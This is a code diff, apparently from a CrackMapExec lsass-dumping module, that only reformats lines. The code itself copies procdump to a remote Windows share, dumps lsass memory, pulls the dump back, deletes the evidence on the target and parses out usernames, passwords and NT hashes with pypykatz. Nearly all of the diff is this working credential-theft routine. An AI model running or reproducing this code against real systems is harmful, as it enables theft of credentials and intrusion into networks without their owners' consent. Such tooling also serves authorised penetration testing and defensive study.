@@ -59,19 +59,11 @@ class CMEModule:
             with open(self.procdump_path + self.procdump, "wb") as procdump:
                 procdump.write(self.procdump_embeded)
 
-        context.log.display(
-            "Copy {} to {}".format(self.procdump_path + self.procdump, self.tmp_dir)
-        )
+        context.log.display("Copy {} to {}".format(self.procdump_path + self.procdump, self.tmp_dir))
         with open(self.procdump_path + self.procdump, "rb") as procdump:
             try:
-                connection.conn.putFile(
-                    self.share, self.tmp_share + self.procdump, procdump.read
-                )
-                context.log.success(
-                    "Created file {} on the \\\\{}{}".format(
-                        self.procdump, self.share, self.tmp_share
-                    )
-                )
+                connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)
+                context.log.success("Created file {} on the \\\\{}{}".format(self.procdump, self.share, self.tmp_share))
             except Exception as e:
                 context.log.fail(f"Error writing file to share {self.share}: {e}")
 
@@ -80,15 +72,7 @@ class CMEModule:
         context.log.display("Getting lsass PID {}".format(command))
         p = connection.execute(command, True)
         pid = p.split(",")[1][1:-1]
-        command = (
-            self.tmp_dir
-            + self.procdump
-            + " -accepteula -ma "
-            + pid
-            + " "
-            + self.tmp_dir
-            + "%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
-        )
+        command = self.tmp_dir + self.procdump + " -accepteula -ma " + pid + " " + self.tmp_dir + "%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
         context.log.display("Executing command {}".format(command))
         p = connection.execute(command, True)
         context.log.debug(p)
@@ -113,38 +97,22 @@ class CMEModule:
 
             with open(self.dir_result + machine_name, "wb+") as dump_file:
                 try:
-                    connection.conn.getFile(
-                        self.share, self.tmp_share + machine_name, dump_file.write
-                    )
-                    context.log.success(
-                        "Dumpfile of lsass.exe was transferred to {}".format(
-                            self.dir_result + machine_name
-                        )
-                    )
+                    connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
+                    context.log.success("Dumpfile of lsass.exe was transferred to {}".format(self.dir_result + machine_name))
                 except Exception as e:
                     context.log.fail("Error while get file: {}".format(e))
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
-                context.log.success(
-                    "Deleted procdump file on the {} share".format(self.share)
-                )
+                context.log.success("Deleted procdump file on the {} share".format(self.share))
             except Exception as e:
-                context.log.fail(
-                    "Error deleting procdump file on share {}: {}".format(self.share, e)
-                )
+                context.log.fail("Error deleting procdump file on share {}: {}".format(self.share, e))
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
-                context.log.success(
-                    "Deleted lsass.dmp file on the {} share".format(self.share)
-                )
+                context.log.success("Deleted lsass.dmp file on the {} share".format(self.share))
             except Exception as e:
-                context.log.fail(
-                    "Error deleting lsass.dmp file on share {}: {}".format(
-                        self.share, e
-                    )
-                )
+                context.log.fail("Error deleting lsass.dmp file on share {}: {}".format(self.share, e))
 
             with open(self.dir_result + machine_name, "rb") as dump:
                 try:
@@ -167,28 +135,17 @@ class CMEModule:
                     ]
                     for luid in pypy_parse.logon_sessions:
                         for ssp in ssps:
-                            for cred in getattr(
-                                pypy_parse.logon_sessions[luid], ssp, []
-                            ):
+                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
                                 domain = getattr(cred, "domainname", None)
                                 username = getattr(cred, "username", None)
                                 password = getattr(cred, "password", None)
                                 NThash = getattr(cred, "NThash", None)
                                 if NThash is not None:
                                     NThash = NThash.hex()
-                                if (
-                                    username
-                                    and (password or NThash)
-                                    and "$" not in username
-                                ):
+                                if username and (password or NThash) and "$" not in username:
                                     print_pass = password if password else NThash
-                                    context.log.highlight(
-                                        domain + "\\" + username + ":" + print_pass
-                                    )
-                                    if (
-                                        "." not in domain
-                                        and domain.upper() in connection.domain.upper()
-                                    ):
+                                    context.log.highlight(domain + "\\" + username + ":" + print_pass)
+                                    if "." not in domain and domain.upper() in connection.domain.upper():
                                         domain = connection.domain
                                         credz_bh.append(
                                             {
